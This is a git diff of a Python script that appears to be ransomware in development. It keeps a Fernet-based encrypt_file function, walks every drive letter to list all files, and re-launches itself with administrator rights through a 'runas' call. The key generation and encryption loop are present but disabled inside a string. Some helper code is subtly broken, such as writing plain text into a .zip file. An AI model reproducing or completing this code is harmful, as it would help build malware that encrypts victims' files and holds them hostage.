@@ -2,6 +2,7 @@ import base64
 import ctypes
 import hashlib
 import os
+import zipfile
 import random
 import re
 import string
@@ -14,11 +15,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 
-
-
-
-
-def encrypt_file(file_path: str, F_key: Fernet):
+def encrypt_file(file_path: str, F_key: Fernet) -> None:
     try_count = 0
     # READ FILE
     with open(file_path, 'rb') as ef:
@@ -59,49 +56,10 @@ def print_r():
 
 
 # allow the program to call and receive powershell cmd
-def powershell(cmd):
+def powershell(cmd) -> subprocess:
     completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
     return completed
 
-
-
-# Get all user specific informations
-def get_user():
-    # find the user
-    user_dir = (str(powershell('ls ~').stdout).split())[2].replace('\\r', '').replace('\\n', '').replace('Mode','').replace('\\\\', '\\')
-    special_folders = ['Music', 'Documents', 'OneDrive', 'Downloads', 'Videos']
-    files = []
-    unexplore_dir = []
-    for e in special_folders:
-        temp = os.listdir(f'{user_dir}\\{e}')
-        for i in range(len(temp)):
-            temp[i] = f'{user_dir}\\{e}\\{temp[i]}'
-            if os.path.isfile(temp[i]):
-                files.append(temp[i])
-            else:
-                unexplore_dir.append(temp[i])
-    _try = 0
-    while len(unexplore_dir) > 0:
-        for e in unexplore_dir:
-            try:
-                temp = os.listdir(e)
-                for i in range(len(temp)):
-                    temp[i] = f'{e}\\{temp[i]}'
-                    if os.path.isfile(temp[i]):
-                        files.append(temp[i])
-                    else:
-                        unexplore_dir.append(temp[i])
-
-                unexplore_dir.remove(e)
-                _try = 0
-
-            except:
-                _try = _try + 1
-                if _try > 2:
-                    unexplore_dir.remove(e)
-                    _try = 0
-                continue
-    return files
 
 def is_admin() -> bool:
     '''
@@ -113,44 +71,56 @@ def is_admin() -> bool:
         return False
 
 
-def all_files(start_path):
+def all_files(start_path: str) -> []:
     '''
     :param start_path: path to look all of the children
     :return : all the computer files
-    Save it in a TXT file
     '''
-    with open('.\\folders.txt','w') as save:
-        for root, dirs, files in os.walk(start_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                print(file_path)
-                save.write(str(f'{file_path}\n'))
-            return files
+    files_in_directory:[] = []
+    for root, dirs, files in os.walk(start_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            files_in_directory.append(file_path)
+            print(file_path)
+    return files_in_directory
 
+
+def compress_files(path: str) -> None:
+    with open('.\\Compress.zip', 'w') as compress:
+        with open(path,'r') as read:
+            for e in read:
+                compress.write(e)
+        read.close()
+    compress.close()
 
 
 def main():
     # Look if program is admin
-    user_files : []
-    files_all : []
+    files:[] = []
+    base = string.ascii_uppercase
 
-    #if True:
-    if is_admin():
-        base = 'C:\\'
-        t = [{'C:\\': []}]
-        test = all_files()
-        time.sleep(10)
-        ''''input(f'next ?')
-        print_r(files_all)
-        own_dir = os.getcwd()  # get is own directory to not encrypt itself
-        key = Fernet.generate_key()  # key generator
-        cipher = Fernet(key)  # hash the key
-        #for e in files:
-        #   if e is not own_dir:
-        #        encrypt_file(e, cipher)  # the file it receive'''
+    if True:
+    #if is_admin():
+        for init_path in base:
+            print(f'starting {init_path}')
+            files.append(all_files(f'{init_path}:\\'))
+
+            ''''input(f'next ?')
+            print_r(files_all)
+            own_dir = os.getcwd()  # get is own directory to not encrypt itself
+            key = Fernet.generate_key()  # key generator
+            cipher = Fernet(key)  # hash the key
+            #for e in files:
+            #   if e is not own_dir:
+            #        encrypt_file(e, cipher)  # the file it receive'''
     else:
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    with open('.\\files.txt','w', encoding="utf-8") as save:
+        for e in files:
+            for k in e:
+                save.write(f'{k}\n')
+        save.close()
     input('its over')
 
 
